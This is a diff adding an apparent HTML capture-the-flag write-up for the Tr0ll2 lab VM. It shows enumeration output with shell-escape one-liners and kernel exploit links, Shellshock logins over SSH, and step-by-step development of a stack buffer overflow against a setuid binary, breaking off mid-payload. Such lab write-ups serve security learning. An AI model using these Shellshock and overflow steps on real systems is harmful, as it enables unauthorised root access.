+             apache2-mpm-worker 2.2.22-1ubuntu1.7  HTTP Server - high speed threaded model
+             apache2-utils 2.2.22-1ubuntu1.7  programs for webservers
+             apache2.2-bin 2.2.22-1ubuntu1.7  HTTP Server common binary files
+             apache2.2-common 2.2.22-1ubuntu1.7  HTTP Server common files
+    root 5 07:29 0:00 [kworker/u:0]
+    root 36 07:29 0:00 [kworker/u:2]
+    root 18 07:29 0:00 [md]
+    root 3 07:29 0:00 [ksoftirqd/0]
+    root 227 07:29 0:00 [scsi_eh_0]
+    root 13 07:29 0:00 [bdi-default]
+    root 234 07:29 0:01 [kworker/0:2]
+    root 326 07:29 0:00 /sbin/udevd
+    root 15 07:29 0:00 [kblockd]
+    root 27 07:29 0:00 [crypto]
+    root 17 07:29 0:00 [khubd]
+    root 7 07:29 0:00 [watchdog/0]
+    root 25 07:29 0:00 [fsnotify_mark]
+    root 715 07:29 0:00 /sbin/getty
+    root 717 07:29 0:00 /sbin/getty
+    root 10 07:29 0:00 [kdevtmpfs]
+    root 896 07:29 0:00 [flush-8:0]
+    root 22 07:29 0:00 [khungtaskd]
+    root 14 07:29 0:00 [kintegrityd]
+    root 242 07:29 0:00 [jbd2/sda1-8]
+    root 516 07:29 0:00 dhclient3
+    root 545 07:29 0:00 /usr/sbin/sshd
+    root 556 07:29 0:00 /usr/sbin/vsftpd
+        Possible Related Packages: 
+             vsftpd 2.3.5-1ubuntu2  efficient FTP server written for security
+    root 57 07:29 0:00 [devfreq_wq]
+    root 224 07:29 0:00 [mpt_poll_0]
+    root 851 07:29 0:00 /sbin/getty
+    root 12 07:29 0:00 [sync_supers]
+    root 243 07:29 0:00 [ext4-dio-unwrit]
+    root 8 07:29 0:00 [cpuset]
+    root 505 07:29 0:00 /sbin/udevd
+    root 563 07:29 0:00 /sbin/udevd
+    root 35 07:29 0:00 [kthrotld]
+    root 6 07:29 0:00 [migration/0]
+    root 1 07:29 0:00 /sbin/init
+        Possible Related Packages: 
+             busybox-initramfs 1:1.18.5-1ubuntu4  shell setup for initramfs
+             initramfs-tools 0.99ubuntu13  for generating an initramfs
+             initramfs-tools-bin 0.99ubuntu13  used by initramfs-tools
+             initscripts 2.88dsf-13.10ubuntu11.1  for initializing and shutting down the system
+             insserv 1.14.0-2.1ubuntu2  to organize boot sequence using LSB init.d script dependencies
+             libklibc 1.5.25-1ubuntu2  libc subset for use with initramfs
+             lsb-base 4.0-0ubuntu20  Standard Base 4.0 init script functionality
+             module-init-tools 3.16-1ubuntu2  for managing Linux kernel modules
+             ncurses-base 5.9-4  terminal type definitions
+             sysvinit-utils 2.88dsf-13.10ubuntu11.1  utilities
+             upstart 1.5-0ubuntu7  init daemon
+    root 642 07:29 0:00 upstart-socket-bridge
+    root 16 07:29 0:00 [ata_sff]
+    root 11 07:29 0:00 [netns]
+    root 9 07:29 0:00 [khelper]
+    root 705 07:29 0:00 /sbin/getty
+    root 225 07:29 0:00 [mpt/0]
+    root 23 07:29 0:00 [kswapd0]
+    root 931 07:41 0:00 sshd:
+    root 24 07:29 0:00 [ksmd]
+    root 732 07:29 0:00 cron
+        Possible Related Packages: 
+             cron 3.0pl1-120ubuntu4  scheduling daemon
+
+[*] ENUMERATING INSTALLED LANGUAGES/TOOLS FOR SPLOIT BUILDING...
+
+[+] Installed Tools
+    /usr/bin/awk
+    /usr/bin/perl
+    /usr/bin/python
+    /usr/bin/gcc
+    /usr/bin/cc
+    /usr/bin/vi
+    /usr/bin/vim
+    /usr/bin/find
+    /bin/nc
+    /usr/bin/wget
+    /usr/bin/ftp
+
+[+] Related Shell Escape Sequences...
+
+    vi-->	:!bash
+    vi-->	:set shell=/bin/bash:shell
+    vi-->	:!bash
+    vi-->	:set shell=/bin/bash:shell
+    awk-->	awk 'BEGIN {system("/bin/bash")}'
+    find-->	find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
+    perl-->	perl -e 'exec "/bin/bash";'
+
+[*] FINDING RELEVENT PRIVILEGE ESCALATION EXPLOITS...
+
+    Note: Exploits relying on a compile/scripting language not detected on this system are marked with a '**' but should still be tested!
+
+    The following exploits are ranked higher in probability of success because this script detected a related running process, OS, or mounted file system
+
+    The following exploits are applicable to this kernel version and should be investigated as well
+    - Kernel ia32syscall Emulation Privilege Escalation || http://www.exploit-db.com/exploits/15023 || Language=c
+    - Sendpage Local Privilege Escalation || http://www.exploit-db.com/exploits/19933 || Language=ruby**
+    - CAP_SYS_ADMIN to Root Exploit 2 (32 and 64-bit) || http://www.exploit-db.com/exploits/15944 || Language=c
+    - CAP_SYS_ADMIN to root Exploit || http://www.exploit-db.com/exploits/15916 || Language=c
+    - MySQL 4.x/5.0 User-Defined Function Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/1518 || Language=c
+    - open-time Capability file_ns_capable() Privilege Escalation || http://www.exploit-db.com/exploits/25450 || Language=c
+    - open-time Capability file_ns_capable() - Privilege Escalation Vulnerability || http://www.exploit-db.com/exploits/25307 || Language=c
+
+Finished
+=================================================================================================
+</pre>
+<p><font size="3.5" color="black">An interesting bash history and directory were found (/nothing_to_see_here/choose_wisely).</font></p>
+<p><font size="3.5" color="black">Navigating to that directory and invoking "r00t" files, gave me different results:</font></p>
+<pre style="background-color:black;color:white;">
+noob@Tr0ll2:~$ /nothing_to_see_here/choose_wisely/door1/./r00t      
+/nothing_to_see_here/choose_wisely/door1/./r00t
+Good job, stand by, executing root shell...
+BUHAHAHA NOOB!
+noob@Tr0ll2:~$ Connection to 192.168.43.4 closed by remote host.
+</pre>
+<br>
+<pre style="background-color:black;color:white;">
+[GandoPC 192.168.43.4]# ssh noob@192.168.43.4 -i noob '() { :;}; /bin/bash'
+python -c 'import pty;pty.spawn("/bin/bash")'
+noob@Tr0ll2:~$ /nothing_to_see_here/choose_wisely/door2/./r00t
+/nothing_to_see_here/choose_wisely/door2/./r00t
+Usage: /nothing_to_see_here/choose_wisely/door2/./r00t input
+noob@Tr0ll2:~$ /nothing_to_see_here/choose_wisely/door2/./r00t whoami
+/nothing_to_see_here/choose_wisely/door2/./r00t whoami
+whoaminoob@Tr0ll2:~$ /nothing_to_see_here/choose_wisely/door3/./r00t
+/nothing_to_see_here/choose_wisely/door3/./r00t
+
+2 MINUTE HARD MODE LOL
+noob@Tr0ll2:~$ ls
+ls
+bash: /bin/ls: Permission denied
+noob@Tr0ll2:~$ exit
+exit
+exit
+exit
+exit
+^C
+</pre>
+<br>
+<pre style="background-color:black;color:white;">
+[GandoPC 192.168.43.4]# ssh noob@192.168.43.4 -i noob '() { :;}; /bin/bash'
+pwd
+/home/noob
+python -c 'import pty;pty.spawn("/bin/bash")'
+noob@Tr0ll2:~$ /nothing_to_see_here/choose_wisely/door2/./r00t ABCDEFG
+/nothing_to_see_here/choose_wisely/door2/./r00t ABCDEFG
+Good job, stand by, executing root shell...
+BUHAHAHA NOOB!
+noob@Tr0ll2:~$ Connection to 192.168.43.4 closed by remote host.
+</pre>
+<p><font size="3.5" color="black">It seemed like every execution of "r00t", it changes directories.</font></p>
+<p><font size="3.5" color="black">I had to use a different strategy - md5sum check.</font></p>
+<pre style="background-color:black;color:white;">
+[GandoPC 192.168.43.4]# ssh noob@192.168.43.4 -i noob '() { :;}; /bin/bash'
+python -c 'import pty;pty.spawn("/bin/bash")'
+noob@Tr0ll2:~$ cd /nothing_to_see_here/choose_wisely;ls -aul
+cd /nothing_to_see_here/choose_wisely;ls -aul
+total 20
+drwsr-xr-x 5 root root 4096 Oct 30 13:32 .
+drwsr-xr-x 3 root root 4096 Oct 30 13:30 ..
+drwsr-xr-x 2 root root 4096 Oct 30 13:30 door1
+drwsr-xr-x 2 root root 4096 Oct 30 13:30 door2
+drwsr-xr-x 2 root root 4096 Oct 30 13:30 door3
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ ls door1   
+ls door1
+r00t
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ ls door2
+ls door2
+r00t
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ ls door3
+ls door3
+r00t
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ cd door1;md5sum r00t
+cd door1;md5sum r00t
+3471481302fe72ed05ab9dd0c6d6b256  r00t
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ cd ../door2;md5sum r00t
+cd ../door2;md5sum r00t
+cce4a113cb9c4630eb12fa5a72732f19  r00t
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ cd ../door3;md5sum r00t
+cd ../door3;md5sum r00t
+0e1049b1040b0598a364f33de29cc2a7  r00t
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ./r00t
+./r00t
+Usage: ./r00t input
+</pre>
+<p><font size="3.5" color="black">Using md5sum check method I could recognize in what door a specific file is nested.</font></p>
+<p><font size="3.5" color="black">The most interesting file that is found has md5sum of - 0e1049b1040b0598a364f33de29cc2a7.</font></p>
+<p><font size="3.5" color="black">Bash history file shows signs of buffer overflow somewhere and the r00t file requires an input.</font></p>
+<p><font size="3.5" color="black">So, I started to fuzz r00t (0e1049b1040b0598a364f33de29cc2a7):</font></p>
+<pre style="background-color:black;color:white;">
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ cd ../door3;md5sum r00t
+cd ../door3;md5sum r00t
+0e1049b1040b0598a364f33de29cc2a7  r00t
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ./r00t
+./r00t
+Usage: ./r00t input
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ./r00t $(python -c 'print "A" * 700')
+<_here/choose_wisely/door3$ ./r00t $(python -c 'print "A" * 700')            
+Segmentation fault
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ./r00t $(python -c 'print "A" * 600')
+<_here/choose_wisely/door3$ ./r00t $(python -c 'print "A" * 600')            
+Segmentation fault
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ./r00t $(python -c 'print "A" * 500')
+<_here/choose_wisely/door3$ ./r00t $(python -c 'print "A" * 500')            
+Segmentation fault
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ./r00t $(python -c 'print "A" * 400')
+<_here/choose_wisely/door3$ ./r00t $(python -c 'print "A" * 400')            
+Segmentation fault
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ./r00t lalala
+./r00t lalala
+lalalanoob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ./r00t $(python -c 'print "A" * 300')
+<_here/choose_wisely/door3$ ./r00t $(python -c 'print "A" * 300')            
+Segmentation fault
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ./r00t $(python -c 'print "A" * 200')
+<_here/choose_wisely/door3$ ./r00t $(python -c 'print "A" * 200')            
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAnoob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ./r00t $(python -c 'print "A" * 250')
+<_here/choose_wisely/door3$ ./r00t $(python -c 'print "A" * 250')            
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAnoob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ 
+</pre>
+<p><font size="3.5" color="black">300 bytes are enough to crash r00t.</font></p>
+<p><font size="3.5" color="black">I created a pattern in order to identify which string is replacing eip register:</font></p>
+<pre style="background-color:black;color:white;">
+[GandoPC ExpDev]# /opt/metasploit/tools/exploit/./kernelpattern_create.rb -l 300
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
+</pre>
+<p><font size="3.5" color="black">I used GDB in order to examine the memory when r00t is crashing.</font></p>
+<pre style="background-color:black;color:white;">
+[GandoPC 192.168.43.4]# ssh noob@192.168.43.4 -i noob '() { :;}; /bin/bash'
+python -c 'import pty;pty.spawn("/bin/bash")' 
+noob@Tr0ll2:~$ md5sum /nothing_to_see_here/choose_wisely/door1/r00t
+md5sum /nothing_to_see_here/choose_wisely/door1/r00t
+3471481302fe72ed05ab9dd0c6d6b256  /nothing_to_see_here/choose_wisely/door1/r00t
+noob@Tr0ll2:~$ md5sum /nothing_to_see_here/choose_wisely/door2/r00t
+md5sum /nothing_to_see_here/choose_wisely/door2/r00t
+cce4a113cb9c4630eb12fa5a72732f19  /nothing_to_see_here/choose_wisely/door2/r00t
+noob@Tr0ll2:~$ md5sum /nothing_to_see_here/choose_wisely/door3/r00t
+md5sum /nothing_to_see_here/choose_wisely/door3/r00t
+0e1049b1040b0598a364f33de29cc2a7  /nothing_to_see_here/choose_wisely/door3/r00t
+noob@Tr0ll2:~$ gdb /nothing_to_see_here/choose_wisely/door3/r00t
+gdb /nothing_to_see_here/choose_wisely/door3/r00t
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /nothing_to_see_here/choose_wisely/door3/r00t...done.
+(gdb) run $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"')
+Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"')                  
+Starting program: /nothing_to_see_here/choose_wisely/door3/r00t $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x6a413969 in ?? ()
+</pre>
+<p><font size="3.5" color="black">Crashed at 0x6a413969.</font></p>
+<p><font size="3.5" color="black">Using pattern_offset.rb I could know what is the exact point of eip register in my buffer.</font></p>
+<pre style="background-color:black;color:white;">
+[gandosha@GandoPC 192.168.43.4]$ /opt/metasploit/tools/exploit/./pattern_offset.rb -l 300 -q 6a413969
+[*] Exact match at offset 268
+</pre>
+<p><font size="3.5" color="black">I ran it again with B's instead of eip:</font></p>
+<pre style="background-color:black;color:white;">
+[GandoPC 192.168.43.4]# ssh noob@192.168.43.4 -i noob '() { :;}; /bin/bash'
+python -c 'import pty;pty.spawn("/bin/bash")'
+noob@Tr0ll2:~$ md5sum /nothing_to_see_here/choose_wisely/door3/r00t
+md5sum /nothing_to_see_here/choose_wisely/door3/r00t
+0e1049b1040b0598a364f33de29cc2a7  /nothing_to_see_here/choose_wisely/door3/r00t
+noob@Tr0ll2:~$ gdb /nothing_to_see_here/choose_wisely/door3/r00t
+gdb /nothing_to_see_here/choose_wisely/door3/r00t
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /nothing_to_see_here/choose_wisely/door3/r00t...done.
+(gdb) run $(python -c 'print "A" * 268 + "B" * 4 + "C" * (300-4-268)')
+run $(python -c 'print "A" * 268 + "B" * 4 + "C" * (300-4-268)')
+Starting program: /nothing_to_see_here/choose_wisely/door3/r00t $(python -c 'print "A" * 268 + "B" * 4 + "C" * (300-4-268)')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+(gdb) info registers
+info registers
+eax            0x12c	300
+ecx            0x0	0
+edx            0x0	0
+ebx            0xb7fd1ff4	-1208147980
+esp            0xbffffbb0	0xbffffbb0
+ebp            0x41414141	0x41414141
+esi            0x0	0
+edi            0x0	0
+eip            0x42424242	0x42424242
+eflags         0x10286	[ PF SF IF RF ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51 
+(gdb) 
+</pre>
+<p><font size="3.5" color="black">Location of esp:</font></p>
+<pre style="background-color:black;color:white;">
+[GandoPC 192.168.43.4]# ssh noob@192.168.43.4 -i noob '() { :;}; /bin/bash'
+python -c 'import pty;pty.spawn("/bin/bash")'
+noob@Tr0ll2:~$  md5sum /nothing_to_see_here/choose_wisely/door3/r00t
+ md5sum /nothing_to_see_here/choose_wisely/door3/r00t
+0e1049b1040b0598a364f33de29cc2a7  /nothing_to_see_here/choose_wisely/door3/r00t
+noob@Tr0ll2:~$ gdb /nothing_to_see_here/choose_wisely/door3/r00t
+gdb /nothing_to_see_here/choose_wisely/door3/r00t
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /nothing_to_see_here/choose_wisely/door3/r00t...done.
+(gdb) run $(python -c 'print "A" * 268 + "B" * 4 + "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"')
+xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"') 
+Starting program: /nothing_to_see_here/choose_wisely/door3/r00t $(python -c 'print "A" * 268 + "B" * 4 + "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+(gdb) info registers
+info registers
+eax            0x118	280
+ecx            0x0	0
+edx            0x0	0
+ebx            0xb7fd1ff4	-1208147980
+esp            0xbffffac0	0xbffffac0
+ebp            0x41414141	0x41414141
+esi            0x0	0
+edi            0x0	0
+eip            0x42424242	0x42424242
+eflags         0x10282	[ SF IF RF ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) x 0xbffffac0
+x 0xbffffac0
+0xbffffac0:	0x04030201
+(gdb) x
+x
+0xbffffac4:	0x08070605
+(gdb) i r esp
+i r esp
+esp            0xbffffac0	0xbffffac0
+(gdb) quit
+quit
+</pre>
+<p><font size="3.5" color="black">esp is in 0xbffffac0.</font></p>
+<p><font size="3.5" color="black">Final bad chars check:</font></p>
+<pre style="background-color:black;color:white;">
+noob@Tr0ll2:~$ md5sum /nothing_to_see_here/choose_wisely/door2/r00t
+md5sum /nothing_to_see_here/choose_wisely/door2/r00t
+0e1049b1040b0598a364f33de29cc2a7  /nothing_to_see_here/choose_wisely/door2/r00t
+noob@Tr0ll2:~$ gdb /nothing_to_see_here/choose_wisely/door2/r00t
+gdb /nothing_to_see_here/choose_wisely/door2/r00t
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /nothing_to_see_here/choose_wisely/door2/r00t...done.
+(gdb) run $(python -c 'print "A" * 268 + "\xc0\xfa\xff\xbf" + "\x01\x02\x03\x04\x05\x06\x07\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"')
+<2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"')                   
+Starting program: /nothing_to_see_here/choose_wisely/door2/r00t $(python -c 'print "A" * 268 + "\xc0\xfa\xff\xbf" + "\x01\x02\x03\x04\x05\x06\x07\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\x